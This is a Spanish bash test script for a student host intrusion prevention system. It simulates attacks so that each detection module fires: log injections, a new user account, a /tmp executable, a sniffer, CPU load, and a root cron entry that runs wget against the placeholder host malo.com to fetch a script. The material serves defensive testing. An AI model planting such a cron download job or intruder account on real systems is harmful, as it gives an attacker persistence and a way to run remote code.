#!/bin/bash
# ============================================================
# probar_todo.sh - sentinel_hips
# ------------------------------------------------------------
# Simula un ataque para cada modulo del HIPS.
# El orquestador debe estar CORRIENDO en otra terminal.
#
# NOTA: algunos modulos revisan cada 15-60 segundos, por eso
# el script espera lo suficiente para darles chance de detectar.
# La prueba completa tarda unos 2-3 minutos.
#
# No limpia los efectos. Para revertir: sudo bash tests/limpiar_pruebas.sh
#
# USO:  sudo bash tests/probar_todo.sh
# ============================================================

DIR="$(dirname "$0")"

echo "============================================================"
echo " PRUEBAS DEL HIPS - simulando ataques"
echo " (el orquestador debe estar corriendo en otra terminal)"
echo " La prueba completa tarda unos 2-3 minutos."
echo "============================================================"
echo ""

# --- Modulo i: integridad ---
echo "[i] Integridad: creando usuario (modifica /etc/passwd y shadow)..."
sudo useradd usuario_intruso 2>/dev/null
echo "    -> MODIFICACION_PASSWD / MODIFICACION_SHADOW"
sleep 5

# --- Modulo vii: /tmp (intervalo 15s) ---
echo "[vii] /tmp: creando ejecutable sospechoso en /tmp..."
echo '#!/bin/bash' > /tmp/malware_prueba.sh
chmod +x /tmp/malware_prueba.sh
echo "    -> ARCHIVO_TMP_SOSPECHOSO (espera hasta 15s)"
sleep 18

# --- Modulo iv: scanner HTTP ---
echo "[iv] Scanner HTTP: inyectando 404 en access.log..."
sudo mkdir -p /var/log/httpd
sudo touch /var/log/httpd/access.log
for i in $(seq 1 25); do
  echo '203.0.113.77 - - [10/Jul/2026:12:00:00] "GET /admin HTTP/1.1" 404 100' | sudo tee -a /var/log/httpd/access.log > /dev/null
done
echo "    -> SCANNER_HTTP (banea 203.0.113.77)"
sleep 12

# --- Modulo viii: DDoS ---
echo "[viii] DDoS: alimentando la captura con el dataset del profesor..."
DNS_FILE=$(ls "$DIR"/*DNS*tcpdump.txt 2>/dev/null | head -1)
if [ -n "$DNS_FILE" ]; then
  sudo cat "$DNS_FILE" >> /var/log/hips/captura_dns.txt
  echo "    -> DDOS_DETECTADO (usa: $(basename "$DNS_FILE"))"
else
  echo "    (no se encontro el dataset DNS en $DIR, se omite)"
fi
sleep 10

# --- Modulo ix: cron ---
echo "[ix] Cron: creando tarea de cron sospechosa..."
echo "* * * * * root wget http://malo.com/x.sh -O /tmp/x.sh" | sudo tee /etc/cron.d/tarea_prueba > /dev/null
echo "    -> CRON_SOSPECHOSO (espera hasta 60s)"
sleep 12

# --- Modulo x: accesos invalidos ---
echo "[x] Accesos: inyectando fallos de login en /var/log/secure..."
FECHA=$(date '+%b %e %H:%M:%S')
for i in 1 2 3 4 5 6; do
  echo "$FECHA tera saslauthd[754]: pam_unix(smtp:auth): authentication failure; logname= uid=0 euid=0 tty= ruser= rhost=  user=usuario_intruso" | sudo tee -a /var/log/secure > /dev/null
done
echo "    -> ACCESO_INVALIDO_REPETIDO"
sleep 5

# --- Modulo iii: sniffer (intervalo 60s, dejamos tcpdump vivo mas tiempo) ---
echo "[iii] Sniffer: lanzando tcpdump (se deja 65s para que el modulo lo detecte)..."
sudo tcpdump -i any > /dev/null 2>&1 &
TCPDUMP_PID=$!
echo "    -> SNIFFER_DETECTADO (el modulo revisa cada 60s, hay que esperar)"

# --- Modulo vi: procesos (necesita 3 lecturas sostenidas, ~30s) ---
echo "[vi] Procesos: generando carga de CPU con 'yes' (se deja ~40s)..."
yes > /dev/null &
YES_PID=$!
echo "    -> PROCESO_ALTO_CONSUMO (necesita 3 lecturas, ~30s)"

echo ""
echo "    Esperando 65s para que los modulos iii (sniffer) y vi (procesos)"
echo "    completen sus ciclos de deteccion..."
sleep 65

# Limpiar los procesos de fondo por si los modulos no los mataron
kill $YES_PID 2>/dev/null
kill $TCPDUMP_PID 2>/dev/null

echo ""
echo "============================================================"
echo " Pruebas terminadas."
echo " Revisa el dashboard web para ver todas las alarmas."
echo " Para revertir los efectos:"
echo "   sudo bash tests/limpiar_pruebas.sh"
echo "============================================================"
